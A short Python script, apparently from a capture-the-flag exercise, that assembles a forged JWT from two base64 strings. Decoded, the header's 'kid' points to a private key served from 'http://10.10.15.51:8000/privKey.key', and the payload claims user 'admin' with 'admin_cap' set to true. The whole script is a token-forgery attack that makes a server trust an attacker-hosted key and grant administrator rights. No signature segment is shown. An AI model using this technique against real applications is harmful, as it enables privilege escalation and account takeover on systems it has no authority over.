header = "eyJ0eXAiOiAiSldUIiwiYWxnIjogIlJTMjU2Iiwia2lkIjogImh0dHA6Ly8xMC4xMC4xNS41MTo4MDAwL3ByaXZLZXkua2V5In0="

payload = "eyJ1c2VybmFtZSI6ICJhZG1pbiAiLCJlbWFpbCI6ICJ0ZXN0QHRlc3QuY29tIiwiYWRtaW5fY2FwIjogdHJ1ZX0="

encrypt = header+"."+payload
print(encrypt)

